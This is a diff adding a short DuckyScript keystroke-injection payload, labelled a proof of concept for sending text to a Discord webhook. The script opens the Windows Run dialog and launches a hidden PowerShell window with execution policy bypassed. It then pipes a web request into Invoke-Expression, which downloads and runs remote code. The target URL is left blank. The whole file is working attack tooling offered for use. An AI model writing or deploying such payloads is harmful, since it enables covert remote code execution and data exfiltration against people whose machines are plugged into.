@@ -1,0 +1,8 @@
+REM By Joshua O' Brien
+REM POC of sending simple text to a server via a discord webhook using powershell commands
+REM Webhook POC v3 - done via downloading .ps file and executing file
+REM open powershell (remove "-W H" to show the window)
+DEFAULT_DELAY 500
+GUI r
+STRING powershell -NoP -Ep Bypass -W H -C $hookurl=''; irm  | iex
+ENTER
